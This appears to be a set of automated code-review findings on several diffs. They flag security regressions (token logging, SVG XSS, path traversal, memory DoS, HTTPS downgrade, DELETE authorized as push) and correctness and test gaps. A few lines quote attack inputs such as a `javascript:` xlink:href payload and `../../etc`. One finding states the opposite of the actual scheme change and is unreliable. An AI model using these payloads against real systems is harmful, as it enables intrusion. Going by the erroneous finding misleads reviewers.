`cutoff` is built with `datetime.now()` (no tzinfo), while `Invite.expires_at` is documented as always timezone-aware UTC. Python raises `TypeError: can't subtract offset-naive and offset-aware datetimes` for `invite.expires_at - cutoff`, so `expires_within` fails unconditionally for every input — there is no reachable path where it returns a value. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. (`timezone` is already imported, since line 5 uses it.) The `.replace(microsecond=0)` truncation is also unnecessary here and only shifts the boundary by up to a second.

_Also raised by the security agent:_ Naive datetime subtracted from tz-aware expires_at raises TypeError

_Also raised by the docs agent:_ Timezone mismatch in expires_within function

findings.title: New expires_within() has no test and would fail at runtime untested
findings.body: expires_within is new, untested code that subtracts a naive datetime.now() from invite.expires_at, which per models/invite.py is always tz-aware. Subtracting naive from aware datetimes raises TypeError in Python. No test exercises this function, so this defect would ship silently and only surface in production when the function is actually called.

findings.title: contactEmail dereferences optional billingContact unguarded
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding." `contactEmail` reads `.email` off it directly, so any account that has not completed onboarding produces `TypeError: Cannot read properties of undefined (reading 'email')`. Under `strictNullChecks` this should also fail to compile; if it does compile, the project has strict null checks off and the failure only surfaces at runtime.

Mirror the guard already used on line 4, e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or change the signature to return `string | undefined` and make callers handle the absent case explicitly. The PR description says "the account payload is always present", but the nullable field here is `billingContact`, not `account`, so that assumption does not cover this dereference.

_Also raised by the docs agent:_ Public API lacks documented precondition

findings.title: No test covers contactEmail with missing billingContact
findings.body: contactEmail accesses account.billingContact.email without an optional check, unlike bannerFor which uses ?.. Since Account.billingContact is documented as optional ('Absent until the customer completes onboarding'), this will throw at runtime for accounts without a billing contact. There is no test exercising this function at all, let alone the missing-billingContact case, so this behavior change (introducing a non-null assumption) would go uncaught.

findings.title: fetch() timeout argument misunderstood: milliseconds vs seconds
findings.body: The `fetch()` function's docstring explicitly states that `timeout` is in MILLISECONDS, requiring callers to multiply if they want seconds. Line 9 passes `timeout=30` to `fetch()`, which would be interpreted as 30 milliseconds (0.03 seconds) — far too short for a remote API call. This is almost certainly a bug caused by the undocumented change in `fetch()`'s timeout contract, or the caller did not read the documentation. Either way, there is a factual discrepancy: the docstring says milliseconds, but the caller is treating the parameter as if it were in seconds.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as being in MILLISECONDS ("Callers wanting seconds must multiply"). Passing `timeout=30` gives the partner API a 30ms budget, shared across the default `retries=3`. The PR description says the timeout was "set generously since their API is slow", which is the opposite of what this value does — the nightly job will fail on essentially every run. Pass `timeout=30_000` (or whatever the intended second count is, multiplied by 1000).

findings.title: New sync_partner_catalogue has no test covering its timeout/behavior
findings.body: sync_partner_catalogue() is new, untested code. It calls fetch(url, timeout=30), but clients/http.py documents timeout as milliseconds, not seconds. A test asserting the call is made with the correct timeout value (in ms) would catch the apparent unit mismatch; as it stands, nothing exercises this function or its interaction with fetch's timeout semantics.

findings.title: Duplicate index: same columns/order already exist as invoices_tenant_created_idx
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same key and sort order as `invoices_tenant_created_idx`, created in migration 0007 and already applied on 2025-11-02. `IF NOT EXISTS` only suppresses creation when an index with that *name* exists; the name differs, so this will actually build a second, redundant index. The cost is real: extra disk, extra write amplification on every INSERT/UPDATE of `invoices`, and a long CONCURRENTLY build on what is presumably a large table — with no query-plan benefit, since the planner can already use the 0007 index for exactly this filter-and-sort pattern. Drop this statement; if the intent was to rename the index for clarity, use `ALTER INDEX invoices_tenant_created_idx RENAME TO ...` instead.

findings.title: Removing _scrub_uri writes auth tokens from Referer into logs
findings.body:
The old branch special-cased `Referer` and passed it through `_scrub_uri(value, extra_param_keys)` before logging; the new line logs `request.headers[header]` unchanged for every header, including `Referer`. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser attaches that full URL — token and all — as the Referer on every subresource request. Any 5xx now serialises a live auth token into the log via `json.dumps(headers, indent=2)`, where it is readable by anyone with log access and replayable for full session access.

Keep the per-header scrub for `Referer` (and re-check whether `extra_param_keys` is still used anywhere after this change — if it is now unused, that is a signal the sanitisation path was dropped wholesale rather than intentionally narrowed).

_Also raised by the security agent:_ Auth token leaks into logs: Referer scrubbing removed

findings.title: Logging unscrubbed Referer headers contradicts design
findings.body: The code now logs the raw Referer header without scrubbing the auth token via `_scrub_uri()`. The repository context shows that Notebook URLs are deliberately constructed to carry the token in the Referer header (see `token_authenticated_url()` docstring: "the browser sends the token back in the Referer header on every subresource request"). Logging this unscrubbed violates the implicit contract that tokens should not be written to logs. The `_scrub_uri()` function exists for this reason and is now dead code. Either restore the scrubbing (lines 5-7 in the original), or document why token exposure in logs is now acceptable.

findings.title: No test guards Referer token-scrubbing before logging
findings.body: This change deletes the call to _scrub_uri(value, extra_param_keys) for the Referer header and logs request.headers['Referer'] directly. Given the repository context showing token_authenticated_url embeds the auth token in the URL and thus the Referer header, this is a behavior change with security relevance, but there is no test asserting that logged Referer values have query-string tokens/secrets stripped. Any test suite for this module would need to assert on the *content* of the logged JSON (e.g. that a token param is absent/masked) to catch this regression; none is present in the diff, so this silent removal of scrubbing would not fail any existing test.

findings.title: Dropping xlinkhref from URL check re-enables SVG xlink:href XSS
findings.body: `validateProp` is described in this file's own header comment as "the only thing standing between" user-submitted markdown and the DOM. Before this change, `xlinkhref` was routed into `isAnchorLinkAllowed(value)`, which screens values against `unsafeLinkPrefix` (`javascript:`, `data:text/html`, `vbscript:`). After the change, `xlinkhref` falls through to whatever the generic path at line 9+ does, so a payload such as `` (or ``) is no longer scheme-checked. `xlink:href` is a long-standing XSS sink in SVG and is honoured by browsers on `` and ``, so this is an attribute that is actively exploited, not a "rarely used" one. Restore `attribute === 'xlinkhref'` in the condition; if the goal is to shrink the allowlist, remove the attribute from the set of rendered attributes entirely rather than removing only its validation.

findings.title: Dropping xlinkhref from the URL check bypasses link validation, not the attribute
findings.body:
The stated intent is to "drop rarely used SVG attributes we do not need". But line 6 is not an allowlist — it is the dispatch into `isAnchorLinkAllowed`, the only place a value is checked against `unsafeLinkPrefix` (`javascript:`, `data:text/html`, `vbscript:`). Removing `xlinkhref` from this condition does not stop the attribute from being emitted; it makes `validateProp('xlinkhref', ...)` skip the URL check entirely and fall through to whatever the function's default return is. If that default is `true` (the usual shape for this helper, given the early `return false` guard above), then `<svg><a xlink:href="javascript:alert(1)">` from author/user markdown now reaches the DOM unvalidated — and `xlink:href` is honoured as a navigable URL by browsers inside SVG.

If the goal really is to stop supporting the attribute, drop it at the point where allowed attribute names are decided so it is stripped from output, and leave the `isAnchorLinkAllowed` dispatch intact for any URL-bearing attribute that is still rendered. If the goal is only to shrink the condition, revert this line.

findings.title: No test guards the removal of xlinkhref validation
findings.body: The change removes 'xlinkhref' from the set of attributes subject to isAnchorLinkAllowed validation, per the file header comment this function is 'the only thing standing between markdown and the DOM'. No test in this diff exercises validateProp with attribute 'xlinkhref' to confirm the new behavior is intentional and safe (or to catch a regression if it is later restored incorrectly). If xlink:href on SVG elements can still reach the DOM unsanitised, nothing here would fail.

findings.title: Removing ValidateID breaks buildPath's documented caller precondition
findings.body:
`common.ValidateID(projectQueryParameter)` was the check that enforced the precondition documented on `DAO.buildPath`: "It does no validation of its own: callers are required to have validated the names before this point." After this change the raw query-parameter value reaches `filepath.Join(d.Folder, project, kind)` unchecked.

The PR description claims "the path join already scopes under the folder root", but `filepath.Join` does the opposite — it calls `Clean` on the result, so a project value containing `..` segments (e.g. `../../etc`) resolves *above* `d.Folder` rather than being rejected. The join is a path constructor, not a containment check.

It also changes observable behaviour for existing callers: a malformed project name used to produce a 400 from `HandleBadRequestError`; it will now fall through to the storage layer and surface as a not-found or internal error, or succeed against an unintended path.

Either restore the `ValidateID` call here, or move validation into `buildPath` and update its doc comment so the precondition is enforced where it is relied upon.

_Also raised by the security agent:_ Removing ValidateID lets attacker-controlled project name traverse paths

findings.title: Removed project-name validation has no test guarding the behavior change
findings.body: The removal of the `common.ValidateID(projectQueryParameter)` check changes how malformed or malicious project names (e.g. containing path traversal sequences) are handled before reaching `buildPath`, which per repository docs assumes callers already validated names. No test in this diff exercises `list()` with an invalid/malicious `projectQueryParameter` to confirm the new behavior (either that it's still safe, or that a 400 is still returned some other way). If the removal is wrong, existing tests would not fail.

findings.title: Buffer pre-reserved from unvalidated client Content-Length
findings.body:
`contentLength` on this path is the value the client declared for the part upload; nothing in the diff bounds it before it is handed to `Reserve`. Because the whole point of the change is to allocate up front instead of growing as bytes arrive, a request that declares a huge length (e.g. `Content-Length: 5000000000`) and then sends a single byte — or nothing at all — causes the server to commit that much memory immediately. Repeat it on a few connections and the process is OOM-killed, without the attacker ever having to transmit the data.

Clamp the reservation before using it: reserve `min(contentLength, someCap)` (the S3 max part size, or a smaller tunable), and only when `contentLength > 0`. The grow-as-you-read behaviour that was removed was what previously tied memory consumption to bytes actually received, so the cap has to restore that property.

_Also raised by the security agent:_ Client-declared Content-Length drives buffer pre-allocation (memory DoS)

findings.title: No test covers pre-reservation behavior with attacker-influenced contentLength
findings.body: The change switches from lazily-growing buffer to eagerly reserving contentLength bytes via Reserve(contentLength). contentLength here is presumably derived from a client-supplied Content-Length header (this whole PR is about a declared-length allocation issue). There is no test exercising this path with edge-case values (negative, zero, mismatched-from-actual-body-size, or very large) to confirm Reserve behaves safely and that upload/MD5 correctness is preserved when actual body length differs from the declared contentLength. If Reserve mishandles these inputs (e.g., panics on negative, or still allows unbounded allocation for a huge declared length), nothing in the test suite would fail.

findings.title: Reserve called with possibly negative/unknown contentLength
findings.body: `contentLength` is an `int64` that, for chunked or otherwise unknown-length request bodies, is conventionally `-1` (and HTTP handlers routinely see `Request.ContentLength == -1`). The previous code never looked at it, so that case was harmless; now it is passed straight into `Reserve`. If `Reserve` forwards the value to `make([]byte, 0, n)` or similar, a negative argument panics at runtime, taking down the request handler. Guard with `if contentLength > 0` before reserving, or have `Reserve` ignore non-positive values.

findings.title: S3 requests silently downgrade to http when is_secure is unset
findings.body:
The original expression `"http" if request.meta.get("is_secure") is False else "https"` only chose plaintext when a caller explicitly set `is_secure = False`; every other case, including the common case where `is_secure` is not present in `request.meta` at all (`.get` returns `None`), resolved to `https`. The new ternary `"https" if request.meta.get("is_secure") else "http"` treats missing/`None` as falsy and selects `http`, so the URL built on line 6 becomes `http://<bucket>.s3.amazonaws.com/...` for every request that does not opt in. Signed S3 requests and their payloads would then travel unencrypted, and existing callers that never set `is_secure` (relying on the secure default) are silently affected — this is a behaviour change, not a simplification.

If the ternary form is preferred, preserve the default explicitly, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"` or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

findings.title: S3 requests default to plaintext HTTP after scheme ternary inversion
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` was fail-secure: HTTPS unless the caller *explicitly* set `is_secure=False`. The new expression `"https" if request.meta.get("is_secure") else "http"` is fail-open: any falsy value — including the `None` returned when `is_secure` is simply absent from `request.meta` — selects `http`. Since most S3 requests will not carry an explicit `is_secure` key, the common path now builds `http://<bucket>.s3.amazonaws.com/...` on line 6 and the request, including its AWS authorization/signature headers and any response body, travels unencrypted and is exposed to network interception and modification.

Restore the fail-secure default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or `scheme = "https" if request.meta.get("is_secure", True) else "http"` if the ternary shape is preferred.

findings.title: Logic inversion changes default scheme to HTTPS, contradicting docstring
findings.body: The scheme selection logic has been inverted: the old code defaulted to HTTPS when `is_secure` was not explicitly False, while the new code defaults to HTTPS when `is_secure` is truthy. This is a breaking change in behavior that violates the documented contract if one exists. The new code now uses HTTPS as the default for all cases except when `is_secure` is explicitly set to True, which is the opposite of the previous behavior. Any documentation stating the previous default (HTTP for secure requests, HTTPS for insecure) is now incorrect.

findings.title: No test covers the changed default-scheme behavior
findings.body: The change inverts the default when `is_secure` is absent from request.meta: previously absent/None defaulted to https (only explicit False forced http), now absent/None defaults to http (only truthy forces https). This is a security-relevant behavioral change to a default, and no test in the diff exercises the case where `is_secure` is unset. If this default flip is wrong, nothing would fail.

findings.title: DELETE now authorizes as "push", bypassing the delete permission
findings.body:
`request.Method` (fully attacker-controlled) is the sole input to the action derivation, and the result flows directly into `requestedAccess = &ResourceAction{Name: name, Action: action}` on line 9, which is what the authorization layer evaluates. With the switch collapsed, `DELETE` no longer yields `"delete"` — it falls into the `!= GET && != HEAD` branch and yields `"push"`. The retrieved config documentation states the three actions are distinct on purpose so that "an account may be allowed to push new tags without being allowed to delete existing ones"; after this change that separation is gone, and any account holding push on a repository can issue `DELETE /v2/<name>/manifests/<ref>` and have it authorized. Restore an explicit `case http.MethodDelete: action = "delete"` (or equivalent branch) before the push fallthrough.

Secondary note: the previous `default` mapped unknown/unlisted methods to `"pull"`; they now map to `"push"`. That direction is more restrictive so it is not a vulnerability, but it is a behavior change worth confirming is intentional.

_Also raised by the correctness agent:_ DELETE now authorizes as "push"; the "delete" action is never produced

findings.title: DELETE method no longer maps to 'delete' action
findings.body: The diff removes the mapping of http.MethodDelete to the 'delete' action, collapsing it into 'push' instead. However, the documented action contract in pkg/api/config/config.go (lines 4-7) states there are three distinct actions: pull, push, and delete. The documentation explicitly notes 'The three actions are distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' This commitment is now violated—DELETE requests will be checked against 'push' permission rather than a distinct 'delete' permission, changing the authorization contract without updating the documentation that callers and administrators rely on.

findings.title: Unlisted methods (OPTIONS, TRACE, …) flip default from "pull" to "push"
findings.body: The removed `default:` arm assigned `pull` for any method not explicitly listed — notably `OPTIONS`, which clients and browsers send as a preflight/capability probe. The new condition treats everything that is not GET/HEAD as `push`, so OPTIONS requests will now be denied for pull-only accounts (and anonymous readers) that previously succeeded. Keep the explicit method list so unrecognised methods fall back to the least-privilege `pull` default.

findings.title: DELETE-to-push collapse has no accompanying test
findings.body: The mapping now treats HTTP DELETE as requiring only 'push' access instead of a distinct 'delete' action, per the repo's own documented intent that pull/push/delete are 'distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' This is a meaningful authorization behavior change, but no test in this diff exercises a DELETE request to confirm which action is now required. If this mapping is wrong (e.g. should still require delete), nothing in the current test suite would fail.

findings.title: Size guard wipes the whole cache, including the entry just stored
findings.body: When the cache exceeds 1000 entries, `_CACHE.clear()` drops every cached tenant rather than evicting one. Two concrete consequences: (a) the entry written on line 10 is immediately discarded, so a `get_tenant(tenant_id)` call right after `get_tenant_fresh(tenant_id)` returns `None` even though the fetch succeeded — surprising for anyone reading this as "refresh into the shared cache"; (b) every other tenant loses its cached value at the same moment, so the next wave of reads all miss and stampede onto `_fetch`. If the intent is to bound cache size, evict a single entry (e.g. pop the oldest key, or use an `OrderedDict`/`functools.lru_cache`-style structure) and perform the size check *before* inserting so the new entry survives.

findings.title: Function name `get_tenant_fresh` misleads about side effects
findings.body: The name `get_tenant_fresh` suggests a read operation that fetches a current value, but the function mutates the shared `_CACHE` dictionary by writing to it and clearing it when size exceeds 1000. Callers expecting a simple getter will be surprised by these side effects. Consider renaming to `fetch_and_cache_tenant` or `refresh_tenant_cache` to clarify that this function modifies shared state.

findings.title: No test for get_tenant_fresh caching/eviction behaviour
findings.body: get_tenant_fresh fetches a tenant, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff: a bug in the cache write (e.g. wrong key, skipped write) or in the eviction threshold (off-by-one, wrong comparison, clearing too eagerly) would not be caught. Suggest adding a test that calls get_tenant_fresh and asserts the tenant is now retrievable via get_tenant, plus a test that fills the cache past 1000 entries and verifies it clears.

findings.title: Attacker-chosen tenant_id can flush the whole shared cache
findings.body:
`get_tenant_fresh` inserts an entry for whatever `tenant_id` it is handed and, once the map exceeds 1000 entries, discards the entire cache rather than evicting a single entry. If any request path lets a caller pass an arbitrary or non-existent tenant id (and no validation appears here or before `_fetch`), a client can walk 1001 junk ids to wipe every legitimate entry, forcing all subsequent `get_tenant` calls back through `_fetch`. That turns a handful of cheap requests into sustained backend load \u2014 a low-cost amplification vector rather than a data-exposure one.

Two mitigations, either of which removes the concern: validate/authorise `tenant_id` before it is used as a cache key so unknown ids are never inserted, and replace `_CACHE.clear()` with bounded eviction (e.g. an LRU such as `functools.lru_cache` or `collections.OrderedDict.popitem(last=False)`) so one caller cannot evict another's entries.

findings.title: Flag rename breaks existing callers of --workers / args.workers
findings.body: `--workers` is removed outright and replaced by `--concurrency`. Two contracts break at once: (a) any script, Makefile, systemd unit or CI job invoking `cli.py --workers N` now fails with `error: unrecognized arguments`, and (b) any code downstream of `parser()` that reads `args.workers` raises `AttributeError`, since argparse names the destination after the new option. If the rename is intended, keep compatibility by adding the old spelling as an alias with an explicit destination, e.g. `p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`, and deprecate the old name over a release rather than deleting it. If it must be a hard break, the consumers of `args.workers` need to be updated in the same change.

findings.title: Documentation references renamed flag --workers
findings.body:
The README documents `--workers` as a CLI flag, but the code has renamed it to `--concurrency`. Update line 7 to reflect the new flag name so users call the tool correctly.

_Also raised by the correctness agent:_ README still documents the removed --workers flag

findings.title: Flag rename from --workers to --concurrency has no test coverage
findings.body: The argparse flag was renamed but no test file appears in this diff verifying that `--concurrency` is accepted (and that `--workers` is no longer silently ignored). If this rename were reverted or partially applied, nothing shown here would fail.

findings.title: Docstring return type no longer matches implementation
findings.body: The docstring states the function returns 'the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping days to counts. Update the docstring to describe the new return format, e.g., 'Return a dictionary mapping day to call count for this month.'

findings.title: Return type changed from int to dict without callers being updated
findings.body: `monthly_usage` previously returned a scalar integer (`_db.scalar(...)`). It now returns `{day: count}`. Any caller doing arithmetic (`usage > limit`, `total + x`, formatting as a number) will now either raise `TypeError` or silently compare/format a dict. The empty case also changes meaning: previously `0` (falsy integer), now `{}` (falsy but not numeric), so `if monthly_usage(a) == 0` stops working. Either keep the total and add a separate `daily_usage` function, or update every caller and rename/version the function so the change is visible. The docstring on line 2 still promises "the total number of API calls this month as an integer", which is now false and will mislead the next reader.

findings.title: No test covers new per-day breakdown return shape
findings.body: monthly_usage now returns a dict keyed by day instead of a single integer total, but no test file is included in this diff. Any caller relying on the old integer contract, or a bug in the GROUP BY/dict construction, would not be caught. Add a test asserting the returned dict has the expected day->count structure for a known set of rows.

findings.title: Docstring references renamed parameter by old name
findings.body:
The docstring documents the parameter as `page_size`, but the function signature (line 1) has renamed it to `limit`. A caller reading the docstring will see instructions to pass `page_size=...` to a function that no longer accepts that parameter. Update line 6 to read `limit: how many invoices to return.`

_Also raised by the correctness agent:_ Docstring still documents the removed `page_size` parameter

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body: `list_invoices` is a public-looking module-level function whose second parameter was renamed from `page_size` to `limit`. Any existing caller written as `list_invoices(tid, page_size=100)` now raises `TypeError: unexpected keyword argument 'page_size'` at runtime — this is not caught by type checkers for dynamically-dispatched calls and will only show up in production paths that are exercised. No repository context was retrieved, so the call sites could not be verified. Before merging, grep for `page_size=` across callers and tests; if any exist, either update them in the same change or keep backwards compatibility (e.g. accept `page_size=None` as a deprecated alias and map it onto `limit`).

findings.title: Parameter rename to list_invoices has no accompanying test
findings.body: list_invoices had its second parameter renamed from page_size to limit. This is a breaking change for any caller using the keyword form (page_size=...). Nothing in this diff demonstrates a test exercising list_invoices with keyword arguments, so a caller still passing page_size= would fail at runtime with no test catching it.

findings.title: PR description does not match the change made
findings.body: The PR says it renames the pagination parameter "from page to offset", but the diff renames `page_size` to `limit`. `limit` and `offset` are different concepts, and the function still takes an opaque `cursor` rather than an offset. Either the description is stale or the wrong rename was applied — worth confirming which, since the intended API shape affects whether callers should be migrated to offset-based paging.

findings.title: `from adapters import HTTPAdapter` is not a package-relative import
findings.body: `adapters` is a sibling module inside the `requests` package, but this is written as a top-level absolute import. On Python 3 (and on Python 2 with `absolute_import` in effect) this resolves against `sys.path`, not the package, so importing `requests` raises `ImportError: No module named 'adapters'` — or, worse, picks up an unrelated `adapters.py` that happens to be importable. Every other import in this header block is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). Change it to `from .adapters import HTTPAdapter`.

findings.title: verify/cert accepted by request() but silently dropped before send
findings.body: The new `request()` signature still advertises `verify=None` and `cert=None`, but neither value is ever attached to `req`/`prep`, and `send()` calls `adapter.send(request)` with the prepared request as its only argument. There is therefore no path by which a caller-supplied CA bundle, `verify=True`, or client certificate reaches the transport. A caller who writes `session.get(url, verify='/etc/ssl/corp-ca.pem')` (or `verify=True` against a session whose config defaults differ) gets a connection established under whatever the adapter happens to default to, with no error and no warning. If `HTTPAdapter.send` does not itself verify by default, every HTTPS request made through this path is trivially MITM-able; even if it does, client-cert authentication is silently unavailable. Either thread `verify`/`cert` through to the adapter (e.g. `adapter.send(prep, verify=verify, cert=cert)`) or raise on the unsupported arguments until the refactor lands, rather than accepting and ignoring them.

findings.title: New `request()` accepts but silently ignores most of its parameters
findings.body:
The rewritten `request()` keeps the full public signature but only forwards `method`, `url`, `headers`, `files`, `data`, `params`, `auth`, `cookies`, `allow_redirects`, `proxies` and `hooks` onto the `Request`. `timeout`, `verify`, `cert`, `config`, `prefetch` and `return_response` are accepted and dropped on the floor. Two of those are silent-failure-shaped rather than merely missing:

- `verify=False`/`verify='/path/ca.pem'` and `cert=...` no longer reach the transport, so TLS verification behaviour is whatever the adapter defaults to regardless of what the caller asked for.
- `return_response=False` previously returned the request object instead of a response; line 167 now unconditionally returns the result of `self.send(prep)`, so those callers get the wrong object type with no error.
- `timeout` being dropped means a hung server hangs the caller forever.

Also missing relative to the old path: merging of the session's own `headers`, `cookies`, `auth`, `params` and `config` into the outgoing request (`self.cookies` is populated at line 121-123 and never consulted here), so per-session defaults stop applying. Either thread these through to `send()`/the adapter, or drop them from the signature so callers fail loudly.

_Also raised by the security agent:_ timeout parameter is ignored, allowing unbounded hangs

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed in this diff, but the retained `old_request` body still ends with `return self._send_request(r, **args)`. Any call into `old_request` — which is the only code path that still honours `timeout`, `verify`, `cert`, `prefetch` and `return_response` — now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` until `old_request` is deleted, or delete `old_request` in the same change.

findings.title: Removed docstring describes behavior no longer present
findings.body: The `close()` method previously had a docstring stating it "closes the PoolManager, which closes pooled connections." This docstring was removed, but callers relying on that documented behavior will now call `close()` and get no cleanup at all. The method's contract has changed but the removal of documentation obscures this breaking change. Either restore the poolmanager cleanup logic or document that `close()` is now a no-op.

findings.title: Connection pooling and cleanup both removed: adapter per send, no-op close
findings.body: `send()` constructs a fresh `HTTPAdapter()` on every call (line 365) and never retains or closes it. Since the adapter owns the `PoolManager` that `Session` used to own, this means (a) no connections are reused across requests on the same session — the `pool_connections`/`pool_maxsize` config is now dead — and (b) each adapter's pool, and its sockets, are left to garbage collection. Meanwhile `close()` is now `pass`, so `Session.__exit__` (line 128-129) no longer releases anything and `with requests.Session() as s:` no longer has cleanup semantics. The adapter should be created once (e.g. in `__init__`, replacing `init_poolmanager`) and `close()` should delegate to it.

findings.title: New send() path via HTTPAdapter has no test coverage
findings.body: Session.send now constructs an HTTPAdapter and delegates request.send() to it, replacing the previous request.send() call. This is a core behavior change (how every request is actually dispatched) but no test in this diff exercises it — if HTTPAdapter.send() returns the wrong object, mishandles prefetch, or breaks under real network conditions, nothing here would fail.

findings.title: Public `send()` method lacks docstring
findings.body: The `send(self, request)` method is public (called externally in HTTP workflows) but carries only a one-line docstring "Send a given PreparedRequest." The implementation now instantiates an HTTPAdapter on every call, which is a significant behavioral detail not documented.
